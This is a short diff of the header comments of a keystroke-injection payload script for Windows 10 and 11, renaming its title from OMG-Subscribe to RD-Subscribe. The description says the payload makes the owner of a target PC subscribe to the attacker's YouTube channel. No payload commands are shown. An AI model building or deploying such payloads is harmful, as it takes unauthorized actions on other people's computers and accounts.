@@ -1,4 +1,4 @@
-REM Title: OMG-Subscribe
+REM Title: RD-Subscribe
 REM Description: This payload is meant to get the owner of the target PC to subscribe to your youtube channel
 REM Author: I am Jakoby
 REM Target: Windows 10, 11
